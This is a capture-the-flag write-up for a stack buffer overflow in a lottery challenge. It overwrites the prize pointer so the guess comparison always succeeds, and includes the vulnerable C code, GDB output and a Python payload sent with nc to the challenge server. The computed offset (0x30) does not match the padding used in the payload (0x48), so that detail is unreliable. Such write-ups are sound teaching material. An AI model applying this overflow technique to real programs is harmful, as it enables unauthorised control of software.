# Challenge `Super Secure Lottery` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Stack-based Buffer Overflow with Logic Bypass (Canary Bypass via Over-read)
- Where: Where is the vulnerability present
  - The vulnerability is located in the `run_lottery` function:
```c
#define GUESS_SIZE 64
#define LOTTERY_LEN 8

char guess[LOTTERY_LEN] = {0};
read(0, guess, GUESS_SIZE);
```
- guess is only 8 bytes long

- read() allows 64 bytes to be written into it
This causes a stack overflow, allowing overwrite of adjacent stack data before the canary, including local variables and function arguments.
- Impact: What results of exploiting this vulnerability
  - Overwrite the pointer prize passed to run_lottery
  -  Redirect it to point to guess itself
  -  Make memcmp(prize, guess, LOTTERY_LEN) always succeed
  - Win the lottery without knowing the random value
  - Retrieve the flag despite stack canaries and NX being enabled

## Steps to reproduce

1. Code analysis
```c
void run_lottery(const char* prize) {
    char guess[8];
    read(0, guess, 64);
    if (!memcmp(prize, guess, 8)) {
        printf("Congratulations! You won the lottery: %s\n", getflag());
    }
}
```
The goal is to overwrite prize so that it points to guess.
2. Stack inspection with GDB
Set a breakpoint:
```
break run_lottery
run
```
Print the address of guess:
```
print &guess
```
Output: `$1 = (char (*)[8]) 0xffffc824`

Print the value of prize:
```
print prize
```
Ouput: `$2 = 0xffffc854 ")\250A.\"\236\020k"`
3. Calculating the offset using the distance between guess and prize: `0xffffc854 - 0xffffc824 = 0x30 = 48 bytes`
4. Send the payload to the challenge server having the little-endian system in consideration:
```bash
python3 - << 'EOF' | nc mustard.stt.rnl.tecnico.ulisboa.pt 25161
import sys
sys.stdout.buffer.write(b"A"*0x48 + b"\x24\xc8\xff\xff")
EOF
```